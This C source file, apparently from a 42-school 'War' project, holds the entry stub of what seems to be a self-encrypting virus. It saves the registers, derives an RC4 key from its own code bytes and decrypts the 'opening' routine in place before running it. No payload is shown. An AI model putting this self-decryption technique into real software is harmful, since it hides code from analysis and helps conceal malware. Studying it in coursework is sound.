/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*  start.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/31 20:59:03 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

int		main(void)
{
	t_data data = {0};

	_memcpy(data.cpr_key, (uint8_t*)start, KEY_SIZE);
	_rc4((uint8_t*)data.cpr_key, KEY_SIZE, (uint8_t*)opening, ((size_t)_rc4 - (size_t)opening));
	opening(&data);
}

void	start(void)
{
	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};
	__asm__ __volatile__ (
		"mov	%0, rsp;"
		: "=r"(data.rsp)
		);

#ifdef DEBUG
	char de[] = "start\t \n";
	data.context == true ?	de[7] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	_memcpy(data.cpr_key, (uint8_t*)start, KEY_SIZE);
	_rc4((uint8_t*)data.cpr_key, KEY_SIZE, (uint8_t*)opening, ((size_t)_rc4 - (size_t)opening));

	data.context = true;
	opening(&data);
}
